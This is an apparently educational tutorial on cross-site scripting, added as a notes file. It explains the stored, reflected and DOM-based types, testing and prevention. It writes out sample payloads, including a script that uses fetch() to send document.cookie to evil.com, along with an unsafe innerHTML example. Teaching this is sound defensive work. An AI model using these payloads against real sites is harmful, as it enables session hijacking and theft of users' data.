@@ -1,0 +1,132 @@
+What is XSS (Cross-Site Scripting)?
+
+XSS is a web vulnerability where an attacker injects malicious JavaScript into a trusted website, which then runs in the victim’s browser.
+
+👉 Goal: steal data, hijack sessions, deface pages, or perform actions as the user.
+
+Why XSS is Dangerous
+
+Steals cookies & session tokens
+
+Performs actions on behalf of the user
+
+Redirects users to fake/malicious sites
+
+Keylogging & phishing
+
+Breaks user trust in websites
+
+How XSS Works (Simple Flow)
+
+Website accepts user input (comment, search box, form)
+
+Input is not properly validated or sanitized
+
+Malicious script is stored or reflected
+
+Victim opens the page
+
+Script executes in victim’s browser
+
+Types of XSS Attacks
+1️⃣ Stored XSS (Persistent XSS)
+
+Malicious script is stored on the server
+
+Executes whenever any user visits the page
+
+Example:
+
+<script>alert("Hacked!")</script>
+
+
+Where found:
+
+Comment sections
+
+Forums
+
+User profiles
+
+🛑 Most dangerous type
+
+2️⃣ Reflected XSS (Non-Persistent)
+
+Script is reflected in the response
+
+Comes from URL or form input
+
+Example URL:
+
+http://site.com/search?q=<script>alert(1)</script>
+
+
+Triggered when:
+
+Victim clicks malicious link
+
+3️⃣ DOM-Based XSS
+
+Happens entirely in the browser
+
+JavaScript modifies the DOM unsafely
+
+Example:
+
+document.innerHTML = location.hash;
+
+
+🧠 Server not involved directly
+
+Common XSS Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<script>document.cookie</script>
+
+Real-World Example
+
+Attacker injects:
+
+<script>
+fetch("https://evil.com?cookie="+document.cookie);
+</script>
+
+
+➡️ Victim’s session cookie is stolen
+
+How to Detect XSS (Testing)
+
+Input fields
+
+URL parameters
+
+Cookies & headers
+
+Burp Suite (Repeater, Intruder)
+
+TryHackMe / PortSwigger labs
+
+Prevention & Mitigation
+🔐 Developer Side
+
+Input validation
+
+Output encoding (HTML, JS, URL)
+
+Use Content Security Policy (CSP)
+
+Avoid innerHTML
+
+Use frameworks (React, Angular)
+
+🧑‍💻 User Side
+
+Avoid clicking unknown links
+
+Use browser security extensions
+
+XSS vs SQL Injection
+Feature	XSS	SQLi
+Target	User browser	Database
+Language	JavaScript	SQL
+Impact	Session hijack	Data leak
